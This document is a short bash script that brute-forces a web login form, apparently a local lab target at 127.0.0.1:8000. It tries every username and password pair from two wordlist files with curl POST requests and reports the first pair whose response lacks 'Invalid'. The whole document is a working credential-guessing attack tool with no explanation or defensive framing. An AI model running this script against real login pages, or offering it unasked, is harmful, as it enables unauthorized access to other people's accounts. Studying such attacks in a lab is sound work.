#!/bin/bash

URL="http://127.0.0.1:8000/login"
USERNAMES="./usernames.txt"
PASSWORDS="./passwords.txt"

while IFS= read -r username; do
    while IFS= read -r password; do
        RESPONSE=$(curl -s -X POST -d "username=$username&password=$password" $URL)

        if [[ ! $RESPONSE == *"Invalid"* ]]; then
            echo "[SUCCESS] Username: $username | Password: $password"
            exit 0
        fi

        echo "[FAILED] Username: $username | Password: $password"

    done < "$PASSWORDS"
done < "$USERNAMES"
